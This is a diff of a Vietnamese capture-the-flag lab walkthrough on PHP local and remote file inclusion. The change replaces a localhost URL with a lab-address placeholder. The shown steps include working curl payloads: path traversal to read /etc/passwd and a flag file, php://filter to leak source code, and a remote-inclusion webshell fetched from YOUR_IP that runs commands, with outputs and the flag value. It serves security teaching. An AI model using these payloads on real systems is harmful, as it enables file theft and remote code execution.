@@ -44,7 +44,10 @@ include($page);
 ```bash
 cd lfi-rfi/lab
 docker compose up -d
-# Lab tại: http://localhost:7108
+
+> 💡 **Lấy link lab:** Mở bài học này trên trang **Learning Detail** → bấm **"Truy cập Lab"** để hệ thống cấp link thực tế (VD: `https://vuln.ghedahaui.online/labs-env/...`). Thay `<LAB_ADDRESS>` bằng link đó trong các lệnh dưới đây.
+
+# Lab tại: <LAB_ADDRESS>
 ```
 
 Lab là trang đọc tin có tham số `page` (nạp nội dung file trong thư mục `pages/`). Có 2 flag: file `/flag.txt` (đọc qua LFI) và flag của webshell (qua RFI).
@@ -54,7 +57,7 @@ Lab là trang đọc tin có tham số `page` (nạp nội dung file trong thư 
 ### Bước 2: Duyệt trang bình thường
 
 ```bash
-$ curl -s "http://localhost:7108/index.php?page=home"
+$ curl -s "<LAB_ADDRESS>/index.php?page=home"
 ( nội dung trang home )
 ```
 
@@ -63,7 +66,7 @@ $ curl -s "http://localhost:7108/index.php?page=home"
 ### Bước 3: LFI đọc /etc/passwd
 
 ```bash
-$ curl -s "http://localhost:7108/index.php?page=../../../../etc/passwd"
+$ curl -s "<LAB_ADDRESS>/index.php?page=../../../../etc/passwd"
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 ...
@@ -76,7 +79,7 @@ daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 ### Bước 4: LFI đọc source code bằng php://filter
 
 ```bash
-$ curl -s "http://localhost:7108/index.php?page=php://filter/convert.base64-encode/resource=home.php"
+$ curl -s "<LAB_ADDRESS>/index.php?page=php://filter/convert.base64-encode/resource=home.php"
 PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4K...
 ```
 
@@ -84,7 +87,7 @@ PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4K...
 
 ```bash
 # Giải mã base64 ra source
-$ curl -s "http://localhost:7108/index.php?page=php://filter/convert.base64-encode/resource=home.php" | base64 -d
+$ curl -s "<LAB_ADDRESS>/index.php?page=php://filter/convert.base64-encode/resource=home.php" | base64 -d
 ```
 
 > **Giải thích:** `php://filter` khiến PHP đọc **source code** rồi encode base64 (vì nếu đọc thẳng, PHP sẽ chạy file rồi mới in output — base64 giúp bạn thấy mã gốc). Từ source bạn tìm tham số, hàm `include`, cấu trúc thư mục... rồi đọc các file khác (`config.php`, `admin.php`).
@@ -92,7 +95,7 @@ $ curl -s "http://localhost:7108/index.php?page=php://filter/convert.base64-enco
 ### Bước 5: Đọc flag qua LFI
 
 ```bash
-$ curl -s "http://localhost:7108/index.php?page=../../../../flag.txt"
+$ curl -s "<LAB_ADDRESS>/index.php?page=../../../../flag.txt"
 FLAG{l0c4l_f1l3_1ncl_2026}
 ```
 
@@ -106,10 +109,10 @@ FLAG{l0c4l_f1l3_1ncl_2026}
 #    và chạy HTTP server:  python3 -m http.server 8888
 
 # 2. Nạp file từ xa vào lab
-$ curl -s "http://localhost:7108/index.php?page=http://YOUR_IP:8888/shell.txt"
+$ curl -s "<LAB_ADDRESS>/index.php?page=http://YOUR_IP:8888/shell.txt"
 
 # 3. Chạy lệnh từ xa
-$ curl -s "http://localhost:7108/index.php?page=http://YOUR_IP:8888/shell.txt&cmd=id"
+$ curl -s "<LAB_ADDRESS>/index.php?page=http://YOUR_IP:8888/shell.txt&cmd=id"
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
